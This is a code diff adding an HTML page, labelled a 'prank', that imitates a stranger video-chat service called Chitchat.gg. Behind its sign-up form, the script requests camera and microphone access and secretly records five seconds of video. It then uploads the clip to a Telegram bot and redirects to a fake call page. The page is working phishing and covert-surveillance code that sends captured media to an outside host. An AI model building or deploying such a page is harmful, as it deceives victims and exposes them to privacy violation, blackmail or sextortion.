@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Chitchat.gg - Prank</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #1a0033, #2e003e);
+      color: white;
+      text-align: center;
+    }
+    .container { padding: 30px 20px; }
+    h1 { font-size: 28px; margin-top: 20px; }
+    .subtitle { font-size: 16px; margin-bottom: 25px; color: #ccc; }
+    .btn {
+      background-color: #9f79ff;
+      color: white;
+      border: none;
+      padding: 14px 25px;
+      font-size: 18px;
+      margin: 10px;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    .feature-box { margin-top: 40px; text-align: left; padding: 0 10px; }
+    .feature-item { margin: 20px 0; }
+    .feature-title { font-weight: bold; font-size: 18px; }
+    .feature-icon { font-size: 24px; display: inline-block; width: 30px; }
+    #formPage { display: none; margin-top: 30px; }
+    select, .gender-option, .complete-btn {
+      margin: 10px;
+      padding: 10px;
+      font-size: 16px;
+      border-radius: 5px;
+    }
+    select { background-color: #1e1e1e; color: white; border: none; }
+    .gender-select {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+    }
+    .gender-option {
+      background-color: #1e1e1e;
+      color: white;
+      border: 2px solid transparent;
+      cursor: pointer;
+    }
+    .gender-option.selected {
+      border-color: #9f79ff;
+    }
+    .note {
+      font-size: 12px;
+      color: #aaa;
+      margin-top: 5px;
+    }
+    video {
+      margin-top: 20px;
+      width: 300px;
+      border-radius: 10px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div id="homePage">
+      <h1>Chitchat.gg</h1>
+      <p class="subtitle">Talk to strangers, Make friends!</p>
+
+      <button class="btn" onclick="alert('Text Chat is under maintenance')">💬 Text Chat</button>
+      <button class="btn" onclick="showForm()">🎥 Video Chat</button>
+
+      <div class="feature-box">
+        <div class="feature-item"><span class="feature-icon">🎥</span><span class="feature-title">Video Chat</span><p>Face to face with strangers worldwide.</p></div>
+        <div class="feature-item"><span class="feature-icon">👥</span><span class="feature-title">Friends & History</span><p>Reconnect with previous matches.</p></div>
+        <div class="feature-item"><span class="feature-icon">🔍</span><span class="feature-title">Search Filters</span><p>Filter by interests, gender, or location.</p></div>
+        <div class="feature-item"><span class="feature-icon">💬</span><span class="feature-title">Text Chat</span><p>Simple, anonymous text chat.</p></div>
+        <div class="feature-item"><span class="feature-icon">🛡️</span><span class="feature-title">Safety & Moderation</span><p>AI powered clean chats.</p></div>
+        <div class="feature-item"><span class="feature-icon">⭐</span><span class="feature-title">Feature Rich</span><p>Avatars, GIFs, video calls, and more!</p></div>
+      </div>
+    </div>
+
+    <div id="formPage">
+      <h2>One last step to get started…</h2>
+      <p>Your Birthday:</p>
+      <select id="day"></select>
+      <select id="month"></select>
+      <select id="year"></select>
+
+      <div class="gender-select">
+        <div class="gender-option" onclick="selectGender(this, 'male')">♂ Male</div>
+        <div class="gender-option" onclick="selectGender(this, 'female')">♀ Female</div>
+      </div>
+
+      <div class="note">This info helps us balance matching. <b>It cannot be changed later!</b></div>
+      <button class="complete-btn" onclick="requestPermissions()">Complete</button>
+
+      <video autoplay muted id="videoPreview"></video>
+    </div>
+  </div>
+
+  <script>
+    const day = document.getElementById("day");
+    const month = document.getElementById("month");
+    const year = document.getElementById("year");
+    let selectedGender = null;
+
+    for (let i = 1; i <= 31; i++) day.innerHTML += `<option>${i}</option>`;
+    for (let i = 1; i <= 12; i++) month.innerHTML += `<option>${i}</option>`;
+    for (let i = 2000; i >= 1950; i--) year.innerHTML += `<option>${i}</option>`;
+
+    function showForm() {
+      document.getElementById("homePage").style.display = "none";
+      document.getElementById("formPage").style.display = "block";
+    }
+
+    function selectGender(el, gender) {
+      document.querySelectorAll('.gender-option').forEach(e => e.classList.remove('selected'));
+      el.classList.add('selected');
+      selectedGender = gender;
+    }
+
+    async function requestPermissions() {
+      if (!selectedGender) return alert("Please select a gender.");
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        document.getElementById("videoPreview").style.display = "block";
+        document.getElementById("videoPreview").srcObject = stream;
+
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+          const blob = new Blob(chunks, { type: 'video/webm' });
+          const file = new File([blob], "recording.webm");
+
+          const formData = new FormData();
+          formData.append("chat_id", "YOUR_CHAT_ID"); // Replace
+          formData.append("video", file);
+
+          await fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendVideo`, {
+            method: "POST",
+            body: formData
+          });
+
+          window.location.href = "https://example.com/fakecall"; // Replace with fake call page
+        };
+
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 5000); // Record for 5s
+
+      } catch (err) {
+        alert("Camera/Microphone access denied.");
+      }
+    }
+  </script>
+</body>
+</html>
